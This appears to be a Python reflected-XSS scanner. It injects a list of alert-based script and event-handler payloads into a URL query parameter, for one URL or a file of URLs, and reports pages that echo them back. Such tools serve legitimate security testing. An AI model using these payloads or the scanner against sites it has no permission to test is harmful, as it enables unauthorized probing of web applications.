import requests
import time
import threading
import sys

# Define the XSS payloads you want to test
payloads = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "'\"><img src=1 onerror=alert(1)>",
    "'\"><svg onload=alert(1)>",
    "'\"><input type=\"image\" src=x onerror=alert(1)>",
    "'\"><body onload=alert(1)>",
    "'\"><b onmouseover=alert(1)>",
    "'\"><button onclick=alert(1)>",
    "'\"><video src=\"x\" onerror=alert(1)>",
    "'\"><audio src=\"x\" onerror=alert(1)>"
]

# ASCII banner
ascii_art = r"""
██╗  ██╗███████╗███████╗██╗  ██╗ ██████╗ 
╚██╗██╔╝██╔════╝██╔════╝██║  ██║██╔════╝ 
 ╚███╔╝ ███████╗███████╗███████║██║  ███╗
 ██╔██╗ ╚════██║╚════██║╚════██║██║   ██║
██╔╝ ██╗███████║███████║     ██║╚██████╔╝
╚═╝  ╚═╝╚══════╝╚══════╝     ╚═╝ ╚═════╝ 
"""

def loading_animation(message="Scanning in progress..."):
    """Displays a loading animation."""
    animation = "|/-\\"
    idx = 0
    sys.stdout.write(f"{message} ")
    while not stop_loading:
        sys.stdout.write(animation[idx % len(animation)])
        sys.stdout.flush()
        sys.stdout.write("\b")
        idx += 1
        time.sleep(0.1)

def scan_xss(url):
    global stop_loading
    vulnerable = False

    print(f"Scanning URL: {url}")
    stop_loading = False
    loading_thread = threading.Thread(target=loading_animation)
    loading_thread.start()

    for payload in payloads:
        # Inject the payload into a query parameter
        injection_url = f"{url}?q={payload}"
        try:
            response = requests.get(injection_url)
            if payload in response.text:
                stop_loading = True
                loading_thread.join()
                print(f"\nVulnerable to XSS: {injection_url}")
                vulnerable = True
        except requests.exceptions.RequestException as e:
            stop_loading = True
            loading_thread.join()
            print(f"\nError: {e}")
            return

    stop_loading = True
    loading_thread.join()

    if not vulnerable:
        print("No XSS vulnerabilities found.")

def scan_from_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.readlines()
        for url in urls:
            url = url.strip()  # Remove any leading/trailing whitespace
            if url:
                scan_xss(url)

if __name__ == "__main__":
    print(ascii_art)
    choice = input("Enter '1' to scan a single URL or '2' to scan URLs from a file: ")
    if choice == '1':
        target_url = input("Enter the URL to scan: ")
        scan_xss(target_url)
    elif choice == '2':
        file_path = input("Enter the path to the .txt file containing URLs: ")
        scan_from_file(file_path)
    else:
        print("Invalid choice. Please enter '1' or '2'.")
